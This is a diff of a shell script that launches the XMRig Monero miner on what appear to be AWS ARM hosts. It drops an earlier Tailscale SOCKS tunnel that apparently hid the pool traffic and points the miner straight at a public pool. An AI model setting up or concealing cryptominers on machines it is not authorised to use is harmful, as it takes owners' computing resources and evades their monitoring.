@@ -41,19 +41,18 @@ fi
 pkill -f tailscaled
 rm -f ts.state ts.sock
 
-echo "Starting Tailscale..."
-./tailscaled --tun=userspace-networking --socket=ts.sock --state=mem: --socks5-server=localhost:1055 &
-sleep 5
+# echo "Starting Tailscale..."
+# ./tailscaled --tun=userspace-networking --socket=ts.sock --state=mem: --socks5-server=localhost:1055 &
+# sleep 5
 
-echo "Connecting to Tailnet..."
-./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="aws-arm-$RANDOM" --accept-dns=false
-sleep 5
+# echo "Connecting to Tailnet..."
+# ./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="aws-arm-$RANDOM" --accept-dns=false
+# sleep 5
 
 echo "Launching XMRig..."
 ./xmrig-aarch64-static \
   -c config.json \
-  -o "$DOCKER_PROXY_IP:9999" \
+  -o "gulf.moneroocean.stream:10128" \
   -u "$WALLET" \
-  --proxy "127.0.0.1:1055" \
   --no-tls \
-  --rig-id "aws-$(hostname)"
+  --rig-id "aws"
